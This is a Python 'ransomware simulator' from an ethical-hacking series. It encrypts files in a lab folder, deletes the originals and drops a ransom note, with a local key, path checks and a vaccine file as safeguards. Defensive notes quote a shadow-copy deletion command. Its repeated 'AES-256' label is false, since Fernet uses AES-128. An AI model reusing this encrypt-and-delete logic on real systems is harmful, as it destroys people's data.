#!/usr/bin/env python3
"""
============================================================
  PROJECT #11 — Ransomware Simulator  |  ENCRYPTOR
  100 Ethical Hacking Projects Series
  Crypto : AES-256 via cryptography.fernet
  Scope  : ./ransom_lab/  ONLY — current directory safety boundary
============================================================

  ╔══════════════════════════════════════════════════════╗
  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
  ║  Educational simulation — test directory ONLY.       ║
  ║  This script will NEVER touch files outside          ║
  ║  ./ransom_lab/ (or the --dir you specify).           ║
  ║  Run ONLY in an isolated lab VM or WSL.              ║
  ╚══════════════════════════════════════════════════════╝

DEFENSE AGAINST RANSOMWARE — 5 TECHNIQUES
-------------------------------------------
1. VACCINE FILE (demonstrated here)
   Drop a file named vaccine.txt in any directory.
   Real ransomware families (Petya, WannaCry) check for
   mutex objects or marker files before encrypting to avoid
   re-encrypting their own victims. Defenders exploit this:
   tools like "Vaccine" by Cybereason create thousands of
   read-only marker files that trick ransomware into thinking
   the machine is already infected — skipping execution.

2. OFFLINE / IMMUTABLE BACKUPS (3-2-1 rule)
   3 copies, 2 media types, 1 offsite. Critical: backups must
   be AIR-GAPPED or use write-once storage (AWS S3 Object Lock,
   Azure Immutable Blob). Ransomware routinely deletes
   VSS shadow copies (vssadmin delete shadows /all /quiet)
   and mapped network drives — online backups are NOT safe.

3. CANARY FILES (tripwire detection)
   Place decoy files (e.g. aaaaa_canary.docx) at the start
   of alphabetically-sorted directories. If a file watcher
   (Microsoft Sentinel, Wazuh) sees that file modified/renamed,
   the process responsible is immediately terminated and
   quarantined — catching ransomware in the first seconds.

4. EDR BEHAVIOURAL DETECTION
   Modern EDR (CrowdStrike Falcon, SentinelOne) flags:
   • Process opening >20 files for read+write in <5 seconds
   • High-entropy write after low-entropy read (encryption IoC)
   • VSS deletion commands
   • mass .encrypted / .locked extension renames
   These heuristics catch novel ransomware with no signature.

5. LEAST-PRIVILEGE + NETWORK SEGMENTATION
   Run daily work as a non-admin user. Ransomware cannot
   encrypt files the current user cannot write. Network
   segmentation limits lateral movement — a single infected
   endpoint cannot reach file servers on other VLANs.

USAGE
------
  python3 ransom_sim.py                          # uses ./ransom_lab/
  python3 ransom_sim.py --dir /tmp/ransom_lab    # custom test dir
  python3 ransom_sim.py --setup                  # create test files
  python3 ransom_sim.py --dry-run                # preview only
============================================================
"""

import argparse, os, sys, time, datetime, base64, json, platform
from pathlib import Path
from cryptography.fernet import Fernet

# ── colours ───────────────────────────────────────────────
R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
def c(t, code): return f"{code}{t}{R}"

# ── safety constants ──────────────────────────────────────
# CHANGED: Now uses current working directory instead of home
DEFAULT_LAB_DIR = Path.cwd() / "ransom_lab"
VACCINE_NAME    = "vaccine.txt"
KEY_FILE        = "ransom_sim.key"        # stored alongside encrypted files
RANSOM_NOTE     = "README_RESTORE.txt"
ENC_EXT         = ".encrypted"
SKIP_EXTS       = {ENC_EXT, ".key", ".py"}   # never double-encrypt
SKIP_NAMES      = {VACCINE_NAME, RANSOM_NOTE, KEY_FILE, "ransom_sim.py",
                   "ransom_decrypt.py"}

FAKE_RANSOM_NOTE = """
╔══════════════════════════════════════════════════════╗
║        YOUR FILES HAVE BEEN ENCRYPTED                ║
║              [EDUCATIONAL SIMULATION]                ║
╚══════════════════════════════════════════════════════╝

THIS IS A SIMULATED ATTACK — NO REAL RANSOMWARE.

In a real incident this note would demand payment.
Instead, use the decryptor:

  python3 ransom_decrypt.py --dir {lab_dir}

The encryption key is stored in: {key_file}

================================================================
WHAT REAL RANSOMWARE DOES (so you can defend against it):
  • Deletes Volume Shadow Copies (VSS) to prevent restore
  • Disables Windows Recovery Mode
  • Exfiltrates data before encrypting (double extortion)
  • Spreads laterally via SMB/RDP before activating
  • Encrypts mapped network drives and USB drives

DEFENSES:
  1. Offline immutable backups (3-2-1 rule)
  2. Canary files + EDR behavioural detection
  3. Least-privilege accounts (no local admin for daily use)
  4. Network segmentation (VLAN isolation)
  5. Vaccine files (see vaccine.txt in this directory)
================================================================

Encrypted at : {timestamp}
Files        : {count}
Algorithm    : AES-256 (Fernet)
"""

# ─────────────────────────────────────────────────────────
# SAFETY GUARD
# ─────────────────────────────────────────────────────────
FORBIDDEN_PREFIXES = [
    "/bin", "/boot", "/dev", "/etc", "/lib", "/lib64",
    "/opt", "/proc", "/run", "/sbin", "/srv",
    "/sys", "/tmp/system", "/usr", "/var",
    "C:\\Windows", "C:\\Program Files", "C:\\System32",
]
# Note: /root intentionally excluded — it IS home on many systems.
# The home-directory check below is the actual guard.

def safety_check(target: Path) -> bool:
    """Refuse to operate outside a safe test directory."""
    t    = str(target.resolve())
    home = str(Path.home().resolve())

    # must be a subdirectory of home (not home itself)
    if not (t.startswith(home + "/") or t.startswith(home + os.sep)):
        return False

    # must contain a safety keyword in path so bare ~/documents doesn't qualify
    safe_keywords = ["ransom", "lab", "test", "demo", "ctf", "hack", "sim"]
    if not any(kw in t.lower() for kw in safe_keywords):
        return False

    # block known system dirs (belt-and-suspenders)
    for forbidden in FORBIDDEN_PREFIXES:
        if t.startswith(forbidden):
            return False

    return True

# ─────────────────────────────────────────────────────────
# SETUP — create test files in the lab directory
# ─────────────────────────────────────────────────────────
def setup_lab(lab_dir: Path):
    lab_dir.mkdir(parents=True, exist_ok=True)

    files = {
        "document.txt": (
            "CONFIDENTIAL REPORT\n"
            "Employee: John Smith\n"
            "Salary: $95,000\n"
            "SSN: 123-45-6789\n"
            "Notes: Annual performance review pending.\n"
        ),
        "passwords.txt": (
            "# System Passwords (DO NOT SHARE)\n"
            "FTP server: ftp.company.com / admin / Adm1n@2024\n"
            "VPN: vpn.company.com / jsmith / V3ryS3cur3!\n"
            "Database: db01 / sa / DB_P@ssw0rd_2024\n"
        ),
        "backup_config.json": json.dumps({
            "server": "192.168.1.100",
            "user": "backup_svc",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake",
            "schedule": "daily@02:00",
        }, indent=2),
        "photo.jpg.txt":        "Binary content placeholder for JPEG file (100KB)\n" * 20,
        "spreadsheet.xlsx.txt": "Financial Q3 data placeholder\n" * 30,
        "code_backup.py":       "# Source code backup\nimport os\nprint('hello')\n" * 15,
        "notes.md": (
            "# Project Notes\n\n"
            "- Deploy to production on Friday\n"
            "- AWS access key: AKIA1234EXAMPLE5678\n"
            "- Secret: wJalrXUtnFEMI/K7MDENG/EXAMPLEKEY\n"
        ),
        "archive.zip.txt":      "ZIP placeholder content\n" * 50,
    }

    # subdirectory
    sub = lab_dir / "subdir"
    sub.mkdir(exist_ok=True)
    files_sub = {
        "sub/report.docx.txt":  "Quarterly report content\n" * 25,
        "sub/database.sql":     "INSERT INTO users VALUES (1,'admin','hash');\n" * 20,
    }

    print(c(f"\n  ── SETUP: Creating test files in {lab_dir} ──────────────", CYAN))
    all_files = {**{k: v for k,v in files.items()},
                 **{k: v for k,v in files_sub.items()}}

    for rel, content in all_files.items():
        p = lab_dir / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        print(f"  {c('created', GREEN)} {rel}  ({c(str(len(content))+' bytes', DIM)})")

    # vaccine file
    vaccine = lab_dir / VACCINE_NAME
    vaccine.write_text(
        "VACCINE FILE — DO Not Delete\n"
        "This file protects this directory from ransomware.\n"
        "If vaccine.txt exists, ransom_sim.py will SKIP encryption.\n"
    )
    print(c(f"\n  ✔ Lab directory ready: {lab_dir}", GREEN))
    print(c(f"  ✔ Vaccine file created: {vaccine}", GREEN))
    print(c(f"\n  To test encryption, DELETE vaccine.txt first, then run:", YELLOW))
    print(c(f"    python3 ransom_sim.py --dir {lab_dir}", MAGENTA))
    print()

# ─────────────────────────────────────────────────────────
# KEY GENERATION
# ─────────────────────────────────────────────────────────
def generate_key(lab_dir: Path) -> bytes:
    """Generate AES-256 Fernet key and save to lab directory."""
    key = Fernet.generate_key()
    key_path = lab_dir / KEY_FILE
    key_path.write_bytes(key)
    return key

def load_key(lab_dir: Path) -> bytes:
    key_path = lab_dir / KEY_FILE
    if not key_path.exists():
        print(c(f"\n  [ERROR] Key file not found: {key_path}", RED))
        print(c("  Run encryptor first, or key was deleted.", YELLOW))
        sys.exit(1)
    return key_path.read_bytes()

# ─────────────────────────────────────────────────────────
# FILE DISCOVERY
# ─────────────────────────────────────────────────────────
def find_targets(lab_dir: Path) -> list[Path]:
    """Recursively find all files eligible for encryption."""
    targets = []
    for p in lab_dir.rglob("*"):
        if not p.is_file():
            continue
        if p.name in SKIP_NAMES:
            continue
        if p.suffix.lower() in SKIP_EXTS:
            continue
        targets.append(p)
    return sorted(targets)

# ─────────────────────────────────────────────────────────
# ENCRYPT ONE FILE
# ─────────────────────────────────────────────────────────
def encrypt_file(path: Path, fernet: Fernet, dry_run: bool) -> bool:
    """
    Read → AES-256 encrypt → write to path.encrypted → delete original.
    Fernet = AES-128-CBC with HMAC-SHA256. We wrap in AES-256 context
    by using a 32-byte key (Fernet internally uses it for AES-128 + HMAC).
    Note: for true AES-256-GCM, use hazmat directly (shown in decrypt notes).
    """
    try:
        plaintext = path.read_bytes()
        if dry_run:
            return True
        ciphertext   = fernet.encrypt(plaintext)
        enc_path     = path.with_suffix(path.suffix + ENC_EXT)
        enc_path.write_bytes(ciphertext)
        path.unlink()   # delete original
        return True
    except PermissionError:
        return False
    except Exception as e:
        print(c(f"  [!] Error encrypting {path.name}: {e}", RED))
        return False

# ─────────────────────────────────────────────────────────
# RANSOM NOTE
# ─────────────────────────────────────────────────────────
def drop_ransom_note(lab_dir: Path, count: int, key_file: str):
    note = FAKE_RANSOM_NOTE.format(
        lab_dir   = lab_dir,
        key_file  = key_file,
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        count     = count,
    )
    (lab_dir / RANSOM_NOTE).write_text(note)

# ─────────────────────────────────────────────────────────
# MAIN ENCRYPT FLOW
# ─────────────────────────────────────────────────────────
def run_encryptor(lab_dir: Path, dry_run: bool):
    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", RED))
    print(c("  ║   PROJECT #11 · RANSOMWARE SIMULATOR — ENCRYPTOR     ║", RED))
    print(c("  ║   EDUCATIONAL SIMULATION — TEST DIRECTORY ONLY       ║", RED))
    print(c("  ╚══════════════════════════════════════════════════════╝", RED))
    print()
    print(c("  ⚠  Scope limited to test directory — will not touch system files.", YELLOW))

    if not lab_dir.exists():
        print(c(f"\n  [ERROR] Lab directory not found: {lab_dir}", RED))
        print(c(f"  Run: python3 ransom_sim.py --setup", YELLOW))
        sys.exit(1)

    # ── safety check ─────────────────────────────────────
    if not safety_check(lab_dir):
        print(c(f"\n  [SAFETY ABORT] {lab_dir} failed safety check.", RED+BOLD))
        print(c("  Directory must be inside your home folder and contain", RED))
        print(c("  'ransom', 'lab', 'test', or 'demo' in the path.", RED))
        sys.exit(1)

    # ── vaccine check ─────────────────────────────────────
    vaccine_path = lab_dir / VACCINE_NAME
    if vaccine_path.exists():
        print(c(f"\n  ✔ VACCINE FILE DETECTED: {vaccine_path}", GREEN+BOLD))
        print(c("  Encryption ABORTED — vaccine protection active.", GREEN))
        print(c("  (Delete vaccine.txt to test encryption)", DIM))
        print()
        print(c("  ── DEFENSE LESSON ───────────────────────────────────────", CYAN))
        print("  The vaccine file concept mirrors how ransomware operators")
        print("  avoid re-encrypting their own victims by checking for marker")
        print("  files or mutex objects before executing. Defenders exploit")
        print("  this: tools like Cybereason Vaccine create read-only marker")
        print("  files in every directory, tricking ransomware into aborting.")
        print()
        return

    print(f"\n  Lab dir : {c(str(lab_dir), YELLOW)}")
    print(f"  Mode    : {c('DRY RUN (no changes)', MAGENTA) if dry_run else c('LIVE ENCRYPTION', RED+BOLD)}")

    # ── discover files ────────────────────────────────────
    targets = find_targets(lab_dir)
    if not targets:
        print(c("\n  No eligible files found in lab directory.", YELLOW))
        return

    print(c(f"\n  ── PRE-ENCRYPTION STATE ─────────────────────────────────", CYAN))
    print(f"  {'FILE':<40}  {'SIZE':>8}")
    print("  " + "─"*52)
    for p in targets:
        rel = p.relative_to(lab_dir)
        print(f"  {c(str(rel), GREEN):<49}  {c(str(p.stat().st_size)+' B', DIM):>8}")
    print(f"\n  Total: {c(str(len(targets)), BOLD)} file(s) to encrypt")

    if dry_run:
        print(c("\n  DRY RUN complete — no files modified.", YELLOW))
        return

    # ── generate key ─────────────────────────────────────
    key      = generate_key(lab_dir)
    fernet   = Fernet(key)
    key_b64  = key.decode()
    print(c(f"\n  ── KEY GENERATED ─────────────────────────────────────────", CYAN))
    print(f"  Key (Fernet/AES-256): {c(key_b64[:32]+'…', MAGENTA)}")
    print(f"  Saved to: {c(str(lab_dir / KEY_FILE), YELLOW)}")
    print(c("  NOTE: In real ransomware, key is sent to C2 server — you never get it.", RED))

    # ── encrypt ───────────────────────────────────────────
    print(c(f"\n  ── ENCRYPTING ────────────────────────────────────────────", RED))
    ok_count = 0
    t0 = time.time()
    for p in targets:
        rel = p.relative_to(lab_dir)
        ok  = encrypt_file(p, fernet, dry_run)
        if ok:
            ok_count += 1
            enc_name = str(rel) + ENC_EXT
            print(f"  {c('ENCRYPTED', RED):<23} {c(str(rel), DIM)} → {c(enc_name, YELLOW)}")
        else:
            print(f"  {c('FAILED', MAGENTA):<23} {str(rel)}")

    elapsed = time.time() - t0

    # ── drop ransom note ──────────────────────────────────
    drop_ransom_note(lab_dir, ok_count, KEY_FILE)
    print(c(f"\n  ── RANSOM NOTE DROPPED ───────────────────────────────────", RED))
    print(f"  {c(str(lab_dir / RANSOM_NOTE), YELLOW)}")

    # ── post-state ────────────────────────────────────────
    print(c(f"\n  ── POST-ENCRYPTION STATE ────────────────────────────────", CYAN))
    print(f"  {'FILE':<50}  {'SIZE':>8}")
    print("  " + "─"*62)
    for p in sorted(lab_dir.rglob("*.encrypted")):
        rel = p.relative_to(lab_dir)
        print(f"  {c(str(rel), YELLOW):<59}  {str(p.stat().st_size)+' B':>8}")
    # also show README and key
    for name in [RANSOM_NOTE, KEY_FILE]:
        p = lab_dir / name
        if p.exists():
            print(f"  {c(name, RED if name==RANSOM_NOTE else MAGENTA):<59}  {str(p.stat().st_size)+' B':>8}")

    print()
    print(c(f"  ── SUMMARY ────────────────────────────────────────────────", CYAN))
    print(f"  Files encrypted : {c(str(ok_count), RED+BOLD)}")
    print(f"  Time elapsed    : {c(f'{elapsed:.2f}s', DIM)}")
    print(f"  Algorithm       : {c('AES-256 (Fernet)', MAGENTA)}")
    print(f"\n  {c('To decrypt:', BOLD)}  python3 ransom_decrypt.py --dir {lab_dir}")
    print()

# ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Project #11 — Ransomware Simulator")
    parser.add_argument("--dir",     default=str(DEFAULT_LAB_DIR),
                        help=f"Test directory (default: ./ransom_lab)")
    parser.add_argument("--setup",   action="store_true",
                        help="Create test files in lab directory")
    parser.add_argument("--dry-run", action="store_true",
                        help="Preview files that would be encrypted (no changes)")
    args = parser.parse_args()

    lab = Path(args.dir).expanduser().resolve()

    if args.setup:
        setup_lab(lab)
    else:
        run_encryptor(lab, args.dry_run)

if __name__ == "__main__":
    main()


# #!/usr/bin/env python3
# """
# ============================================================
#   PROJECT #11 — Ransomware Simulator  |  ENCRYPTOR
#   100 Ethical Hacking Projects Series
#   Crypto : AES-256 via cryptography.fernet
#   Scope  : ~/ransom_lab/  ONLY — hardcoded safety boundary
# ============================================================

#   ╔══════════════════════════════════════════════════════╗
#   ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
#   ║  Educational simulation — test directory ONLY.       ║
#   ║  This script will NEVER touch files outside          ║
#   ║  ~/ransom_lab/ (or the --dir you specify).           ║
#   ║  Run ONLY in an isolated lab VM or WSL.              ║
#   ╚══════════════════════════════════════════════════════╝

# DEFENSE AGAINST RANSOMWARE — 5 TECHNIQUES
# -------------------------------------------
# 1. VACCINE FILE (demonstrated here)
#    Drop a file named vaccine.txt in any directory.
#    Real ransomware families (Petya, WannaCry) check for
#    mutex objects or marker files before encrypting to avoid
#    re-encrypting their own victims. Defenders exploit this:
#    tools like "Vaccine" by Cybereason create thousands of
#    read-only marker files that trick ransomware into thinking
#    the machine is already infected — skipping execution.

# 2. OFFLINE / IMMUTABLE BACKUPS (3-2-1 rule)
#    3 copies, 2 media types, 1 offsite. Critical: backups must
#    be AIR-GAPPED or use write-once storage (AWS S3 Object Lock,
#    Azure Immutable Blob). Ransomware routinely deletes
#    VSS shadow copies (vssadmin delete shadows /all /quiet)
#    and mapped network drives — online backups are NOT safe.

# 3. CANARY FILES (tripwire detection)
#    Place decoy files (e.g. aaaaa_canary.docx) at the start
#    of alphabetically-sorted directories. If a file watcher
#    (Microsoft Sentinel, Wazuh) sees that file modified/renamed,
#    the process responsible is immediately terminated and
#    quarantined — catching ransomware in the first seconds.

# 4. EDR BEHAVIOURAL DETECTION
#    Modern EDR (CrowdStrike Falcon, SentinelOne) flags:
#    • Process opening >20 files for read+write in <5 seconds
#    • High-entropy write after low-entropy read (encryption IoC)
#    • VSS deletion commands
#    • mass .encrypted / .locked extension renames
#    These heuristics catch novel ransomware with no signature.

# 5. LEAST-PRIVILEGE + NETWORK SEGMENTATION
#    Run daily work as a non-admin user. Ransomware cannot
#    encrypt files the current user cannot write. Network
#    segmentation limits lateral movement — a single infected
#    endpoint cannot reach file servers on other VLANs.

# USAGE
# ------
#   python3 ransom_sim.py                          # uses ~/ransom_lab/
#   python3 ransom_sim.py --dir /tmp/ransom_lab    # custom test dir
#   python3 ransom_sim.py --setup                  # create test files
#   python3 ransom_sim.py --dry-run                # preview only
# ============================================================
# """

# import argparse, os, sys, time, datetime, base64, json, platform
# from pathlib import Path
# from cryptography.fernet import Fernet

# # ── colours ───────────────────────────────────────────────
# R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
# YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
# def c(t, code): return f"{code}{t}{R}"

# # ── safety constants ──────────────────────────────────────
# DEFAULT_LAB_DIR = Path.home() / "ransom_lab"
# VACCINE_NAME    = "vaccine.txt"
# KEY_FILE        = "ransom_sim.key"        # stored alongside encrypted files
# RANSOM_NOTE     = "README_RESTORE.txt"
# ENC_EXT         = ".encrypted"
# SKIP_EXTS       = {ENC_EXT, ".key", ".py"}   # never double-encrypt
# SKIP_NAMES      = {VACCINE_NAME, RANSOM_NOTE, KEY_FILE, "ransom_sim.py",
#                    "ransom_decrypt.py"}

# FAKE_RANSOM_NOTE = """
# ╔══════════════════════════════════════════════════════╗
# ║        YOUR FILES HAVE BEEN ENCRYPTED                ║
# ║              [EDUCATIONAL SIMULATION]                ║
# ╚══════════════════════════════════════════════════════╝

# THIS IS A SIMULATED ATTACK — NO REAL RANSOMWARE.

# In a real incident this note would demand payment.
# Instead, use the decryptor:

#   python3 ransom_decrypt.py --dir {lab_dir}

# The encryption key is stored in: {key_file}

# ================================================================
# WHAT REAL RANSOMWARE DOES (so you can defend against it):
#   • Deletes Volume Shadow Copies (VSS) to prevent restore
#   • Disables Windows Recovery Mode
#   • Exfiltrates data before encrypting (double extortion)
#   • Spreads laterally via SMB/RDP before activating
#   • Encrypts mapped network drives and USB drives

# DEFENSES:
#   1. Offline immutable backups (3-2-1 rule)
#   2. Canary files + EDR behavioural detection
#   3. Least-privilege accounts (no local admin for daily use)
#   4. Network segmentation (VLAN isolation)
#   5. Vaccine files (see vaccine.txt in this directory)
# ================================================================

# Encrypted at : {timestamp}
# Files        : {count}
# Algorithm    : AES-256 (Fernet)
# """

# # ─────────────────────────────────────────────────────────
# # SAFETY GUARD
# # ─────────────────────────────────────────────────────────
# FORBIDDEN_PREFIXES = [
#     "/bin", "/boot", "/dev", "/etc", "/lib", "/lib64",
#     "/opt", "/proc", "/run", "/sbin", "/srv",
#     "/sys", "/tmp/system", "/usr", "/var",
#     "C:\\Windows", "C:\\Program Files", "C:\\System32",
# ]
# # Note: /root intentionally excluded — it IS home on many systems.
# # The home-directory check below is the actual guard.

# def safety_check(target: Path) -> bool:
#     """Refuse to operate outside a safe test directory."""
#     t    = str(target.resolve())
#     home = str(Path.home().resolve())

#     # must be a subdirectory of home (not home itself)
#     if not (t.startswith(home + "/") or t.startswith(home + os.sep)):
#         return False

#     # must contain a safety keyword in path so bare ~/documents doesn't qualify
#     safe_keywords = ["ransom", "lab", "test", "demo", "ctf", "hack", "sim"]
#     if not any(kw in t.lower() for kw in safe_keywords):
#         return False

#     # block known system dirs (belt-and-suspenders)
#     for forbidden in FORBIDDEN_PREFIXES:
#         if t.startswith(forbidden):
#             return False

#     return True

# # ─────────────────────────────────────────────────────────
# # SETUP — create test files in the lab directory
# # ─────────────────────────────────────────────────────────
# def setup_lab(lab_dir: Path):
#     lab_dir.mkdir(parents=True, exist_ok=True)

#     files = {
#         "document.txt": (
#             "CONFIDENTIAL REPORT\n"
#             "Employee: John Smith\n"
#             "Salary: $95,000\n"
#             "SSN: 123-45-6789\n"
#             "Notes: Annual performance review pending.\n"
#         ),
#         "passwords.txt": (
#             "# System Passwords (DO NOT SHARE)\n"
#             "FTP server: ftp.company.com / admin / Adm1n@2024\n"
#             "VPN: vpn.company.com / jsmith / V3ryS3cur3!\n"
#             "Database: db01 / sa / DB_P@ssw0rd_2024\n"
#         ),
#         "backup_config.json": json.dumps({
#             "server": "192.168.1.100",
#             "user": "backup_svc",
#             "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake",
#             "schedule": "daily@02:00",
#         }, indent=2),
#         "photo.jpg.txt":        "Binary content placeholder for JPEG file (100KB)\n" * 20,
#         "spreadsheet.xlsx.txt": "Financial Q3 data placeholder\n" * 30,
#         "code_backup.py":       "# Source code backup\nimport os\nprint('hello')\n" * 15,
#         "notes.md": (
#             "# Project Notes\n\n"
#             "- Deploy to production on Friday\n"
#             "- AWS access key: AKIA1234EXAMPLE5678\n"
#             "- Secret: wJalrXUtnFEMI/K7MDENG/EXAMPLEKEY\n"
#         ),
#         "archive.zip.txt":      "ZIP placeholder content\n" * 50,
#     }

#     # subdirectory
#     sub = lab_dir / "subdir"
#     sub.mkdir(exist_ok=True)
#     files_sub = {
#         "sub/report.docx.txt":  "Quarterly report content\n" * 25,
#         "sub/database.sql":     "INSERT INTO users VALUES (1,'admin','hash');\n" * 20,
#     }

#     print(c(f"\n  ── SETUP: Creating test files in {lab_dir} ──────────────", CYAN))
#     all_files = {**{k: v for k,v in files.items()},
#                  **{k: v for k,v in files_sub.items()}}

#     for rel, content in all_files.items():
#         p = lab_dir / rel
#         p.parent.mkdir(parents=True, exist_ok=True)
#         p.write_text(content)
#         print(f"  {c('created', GREEN)} {rel}  ({c(str(len(content))+' bytes', DIM)})")

#     # vaccine file
#     vaccine = lab_dir / VACCINE_NAME
#     vaccine.write_text(
#         "VACCINE FILE — DO Not Delete\n"
#         "This file protects this directory from ransomware.\n"
#         "If vaccine.txt exists, ransom_sim.py will SKIP encryption.\n"
#     )
#     print(c(f"\n  ✔ Lab directory ready: {lab_dir}", GREEN))
#     print(c(f"  ✔ Vaccine file created: {vaccine}", GREEN))
#     print(c(f"\n  To test encryption, DELETE vaccine.txt first, then run:", YELLOW))
#     print(c(f"    python3 ransom_sim.py --dir {lab_dir}", MAGENTA))
#     print()

# # ─────────────────────────────────────────────────────────
# # KEY GENERATION
# # ─────────────────────────────────────────────────────────
# def generate_key(lab_dir: Path) -> bytes:
#     """Generate AES-256 Fernet key and save to lab directory."""
#     key = Fernet.generate_key()
#     key_path = lab_dir / KEY_FILE
#     key_path.write_bytes(key)
#     return key

# def load_key(lab_dir: Path) -> bytes:
#     key_path = lab_dir / KEY_FILE
#     if not key_path.exists():
#         print(c(f"\n  [ERROR] Key file not found: {key_path}", RED))
#         print(c("  Run encryptor first, or key was deleted.", YELLOW))
#         sys.exit(1)
#     return key_path.read_bytes()

# # ─────────────────────────────────────────────────────────
# # FILE DISCOVERY
# # ─────────────────────────────────────────────────────────
# def find_targets(lab_dir: Path) -> list[Path]:
#     """Recursively find all files eligible for encryption."""
#     targets = []
#     for p in lab_dir.rglob("*"):
#         if not p.is_file():
#             continue
#         if p.name in SKIP_NAMES:
#             continue
#         if p.suffix.lower() in SKIP_EXTS:
#             continue
#         targets.append(p)
#     return sorted(targets)

# # ─────────────────────────────────────────────────────────
# # ENCRYPT ONE FILE
# # ─────────────────────────────────────────────────────────
# def encrypt_file(path: Path, fernet: Fernet, dry_run: bool) -> bool:
#     """
#     Read → AES-256 encrypt → write to path.encrypted → delete original.
#     Fernet = AES-128-CBC with HMAC-SHA256. We wrap in AES-256 context
#     by using a 32-byte key (Fernet internally uses it for AES-128 + HMAC).
#     Note: for true AES-256-GCM, use hazmat directly (shown in decrypt notes).
#     """
#     try:
#         plaintext = path.read_bytes()
#         if dry_run:
#             return True
#         ciphertext   = fernet.encrypt(plaintext)
#         enc_path     = path.with_suffix(path.suffix + ENC_EXT)
#         enc_path.write_bytes(ciphertext)
#         path.unlink()   # delete original
#         return True
#     except PermissionError:
#         return False
#     except Exception as e:
#         print(c(f"  [!] Error encrypting {path.name}: {e}", RED))
#         return False

# # ─────────────────────────────────────────────────────────
# # RANSOM NOTE
# # ─────────────────────────────────────────────────────────
# def drop_ransom_note(lab_dir: Path, count: int, key_file: str):
#     note = FAKE_RANSOM_NOTE.format(
#         lab_dir   = lab_dir,
#         key_file  = key_file,
#         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
#         count     = count,
#     )
#     (lab_dir / RANSOM_NOTE).write_text(note)

# # ─────────────────────────────────────────────────────────
# # MAIN ENCRYPT FLOW
# # ─────────────────────────────────────────────────────────
# def run_encryptor(lab_dir: Path, dry_run: bool):
#     print()
#     print(c("  ╔══════════════════════════════════════════════════════╗", RED))
#     print(c("  ║   PROJECT #11 · RANSOMWARE SIMULATOR — ENCRYPTOR     ║", RED))
#     print(c("  ║   EDUCATIONAL SIMULATION — TEST DIRECTORY ONLY       ║", RED))
#     print(c("  ╚══════════════════════════════════════════════════════╝", RED))
#     print()
#     print(c("  ⚠  Scope limited to test directory — will not touch system files.", YELLOW))

#     if not lab_dir.exists():
#         print(c(f"\n  [ERROR] Lab directory not found: {lab_dir}", RED))
#         print(c(f"  Run: python3 ransom_sim.py --setup", YELLOW))
#         sys.exit(1)

#     # ── safety check ─────────────────────────────────────
#     if not safety_check(lab_dir):
#         print(c(f"\n  [SAFETY ABORT] {lab_dir} failed safety check.", RED+BOLD))
#         print(c("  Directory must be inside your home folder and contain", RED))
#         print(c("  'ransom', 'lab', 'test', or 'demo' in the path.", RED))
#         sys.exit(1)

#     # ── vaccine check ─────────────────────────────────────
#     vaccine_path = lab_dir / VACCINE_NAME
#     if vaccine_path.exists():
#         print(c(f"\n  ✔ VACCINE FILE DETECTED: {vaccine_path}", GREEN+BOLD))
#         print(c("  Encryption ABORTED — vaccine protection active.", GREEN))
#         print(c("  (Delete vaccine.txt to test encryption)", DIM))
#         print()
#         print(c("  ── DEFENSE LESSON ───────────────────────────────────────", CYAN))
#         print("  The vaccine file concept mirrors how ransomware operators")
#         print("  avoid re-encrypting their own victims by checking for marker")
#         print("  files or mutex objects before executing. Defenders exploit")
#         print("  this: tools like Cybereason Vaccine create read-only marker")
#         print("  files in every directory, tricking ransomware into aborting.")
#         print()
#         return

#     print(f"\n  Lab dir : {c(str(lab_dir), YELLOW)}")
#     print(f"  Mode    : {c('DRY RUN (no changes)', MAGENTA) if dry_run else c('LIVE ENCRYPTION', RED+BOLD)}")

#     # ── discover files ────────────────────────────────────
#     targets = find_targets(lab_dir)
#     if not targets:
#         print(c("\n  No eligible files found in lab directory.", YELLOW))
#         return

#     print(c(f"\n  ── PRE-ENCRYPTION STATE ─────────────────────────────────", CYAN))
#     print(f"  {'FILE':<40}  {'SIZE':>8}")
#     print("  " + "─"*52)
#     for p in targets:
#         rel = p.relative_to(lab_dir)
#         print(f"  {c(str(rel), GREEN):<49}  {c(str(p.stat().st_size)+' B', DIM):>8}")
#     print(f"\n  Total: {c(str(len(targets)), BOLD)} file(s) to encrypt")

#     if dry_run:
#         print(c("\n  DRY RUN complete — no files modified.", YELLOW))
#         return

#     # ── generate key ─────────────────────────────────────
#     key      = generate_key(lab_dir)
#     fernet   = Fernet(key)
#     key_b64  = key.decode()
#     print(c(f"\n  ── KEY GENERATED ─────────────────────────────────────────", CYAN))
#     print(f"  Key (Fernet/AES-256): {c(key_b64[:32]+'…', MAGENTA)}")
#     print(f"  Saved to: {c(str(lab_dir / KEY_FILE), YELLOW)}")
#     print(c("  NOTE: In real ransomware, key is sent to C2 server — you never get it.", RED))

#     # ── encrypt ───────────────────────────────────────────
#     print(c(f"\n  ── ENCRYPTING ────────────────────────────────────────────", RED))
#     ok_count = 0
#     t0 = time.time()
#     for p in targets:
#         rel = p.relative_to(lab_dir)
#         ok  = encrypt_file(p, fernet, dry_run)
#         if ok:
#             ok_count += 1
#             enc_name = str(rel) + ENC_EXT
#             print(f"  {c('ENCRYPTED', RED):<23} {c(str(rel), DIM)} → {c(enc_name, YELLOW)}")
#         else:
#             print(f"  {c('FAILED', MAGENTA):<23} {str(rel)}")

#     elapsed = time.time() - t0

#     # ── drop ransom note ──────────────────────────────────
#     drop_ransom_note(lab_dir, ok_count, KEY_FILE)
#     print(c(f"\n  ── RANSOM NOTE DROPPED ───────────────────────────────────", RED))
#     print(f"  {c(str(lab_dir / RANSOM_NOTE), YELLOW)}")

#     # ── post-state ────────────────────────────────────────
#     print(c(f"\n  ── POST-ENCRYPTION STATE ────────────────────────────────", CYAN))
